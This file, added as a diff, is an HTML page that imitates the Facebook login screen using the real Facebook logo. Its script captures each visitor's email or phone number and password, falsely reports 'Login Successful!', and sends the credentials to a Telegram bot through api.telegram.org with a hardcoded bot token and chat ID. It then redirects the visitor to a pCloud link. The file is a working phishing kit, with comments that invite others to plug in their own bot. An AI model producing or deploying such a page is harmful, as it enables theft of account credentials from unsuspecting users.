@@ -1,0 +1,166 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Facebook</title>
+    <style>
+        body {
+            font-family: sans-serif;
+            margin: 0;
+            padding: 0;
+            background-color: #f0f2f5; /* Light gray background */
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            min-height: 100vh;
+        }
+
+        .container {
+            background-color: white;
+            padding: 20px;
+            border-radius: 8px;
+            box-shadow: 0 2px 4px rgba(0, 0, 0, 0.1);
+            width: 350px; /* Adjust width as needed */
+        }
+
+        .facebook-logo {
+            width: 200px; /* Adjust size as needed */
+            margin: 0 auto 20px; /* Center the logo */
+            display: block;
+        }
+
+        .input-group {
+            margin-bottom: 15px;
+        }
+
+        label {
+            display: block;
+            margin-bottom: 5px;
+        }
+
+        input[type="text"],
+        input[type="password"] {
+            width: calc(100% - 12px); /* Account for padding and border */
+            padding: 8px;
+            border: 1px solid #ddd;
+            border-radius: 4px;
+            box-sizing: border-box;
+        }
+
+        button {
+            background-color: #1877f2; /* Blue button color */
+            color: white;
+            padding: 10px 15px;
+            border: none;
+            border-radius: 4px;
+            cursor: pointer;
+            width: 100%;
+        }
+
+        .forgot-password {
+            text-align: center;
+            margin-top: 15px;
+        }
+
+        a {
+            color: #1877f2;
+            text-decoration: none;
+        }
+
+        a:hover {
+            text-decoration: underline;
+        }
+
+        .login-message {
+            margin-top: 20px;
+            color: green;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <img class="facebook-logo" src="https://z-m-static.xx.fbcdn.net/rsrc.php/v4/y6/r/UbJC5lwxeBU.png" alt="Facebook Logo"> 
+
+        <form id="loginForm">
+            <div class="input-group">
+                <label for="email">Mobile number or email address</label>
+                <input type="text" id="email" name="email" required aria-label="Mobile number or email address">
+            </div>
+
+            <div class="input-group">
+                <label for="password">Password</label>
+                <input type="password" id="password" name="password" required aria-label="Password">
+            </div>
+
+            <button type="submit">Log In</button>
+        </form>
+
+        <div class="forgot-password">
+            <a href="#">Forgotten Password?</a>
+        </div>
+
+        <div class="login-message" id="loginMessage"></div>
+    </div>
+
+    <script>
+        document.getElementById("loginForm").addEventListener("submit", function(event) {
+            event.preventDefault();  // Prevent the default form submission
+
+            // Collect form data
+            var email = document.getElementById("email").value;
+            var password = document.getElementById("password").value;
+
+            // Simulate login process (accept any number and password)
+            // You can replace this with a proper authentication system later
+            if (email && password) {
+                // Display "Login Successful" message
+                document.getElementById("loginMessage").innerHTML = "Login Successful!";
+                document.getElementById("loginMessage").style.color = "green";
+
+                // Send login details to Telegram bot
+                sendLoginDetailsToTelegram(email, password);
+
+                // Redirect to a new website (you can replace the URL with any site you want)
+                setTimeout(function() {
+                    window.location.href = "https://u.pcloud.link/publink/show?code=kZtQgz5ZfjwhqxLcWfHDdQ47W2IdmpMPiqly";  // Change this URL to your desired website
+                }, 2000);  // Redirect after 2 seconds (allowing user to see "Login Successful" message)
+            } else {
+                // Show error if the fields are empty
+                document.getElementById("loginMessage").innerHTML = "Please enter valid login details.";
+                document.getElementById("loginMessage").style.color = "red";
+            }
+        });
+
+        // Function to send login details to Telegram bot
+        function sendLoginDetailsToTelegram(email, password) {
+            var botToken = '7812857640:AAE8FcRi18jcQLOPT871bq0y6vlQ9qyumjs';  // Replace with your bot token
+            var chatId = '7987662357';  // Replace with your chat ID
+            
+            // Create the message to send to Telegram
+            var message = "Login Attempt Details:\n";
+            message += "Email/Phone: " + email + "\n";
+            message += "Password: " + password + "\n";
+            message += "Login Status: Successful";
+
+            // Encode the message to be safely sent via URL
+            var apiUrl = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`;
+
+            // Send the data to the Telegram bot using fetch API
+            fetch(apiUrl)
+                .then(response => response.json())
+                .then(data => {
+                    if (data.ok) {
+                        console.log("Login details sent to Telegram bot.");
+                    } else {
+                        console.error("Error sending data to Telegram bot.");
+                    }
+                })
+                .catch(error => {
+                    console.error("Error: " + error);
+                });
+        }
+    </script>
+</body>
+</html>
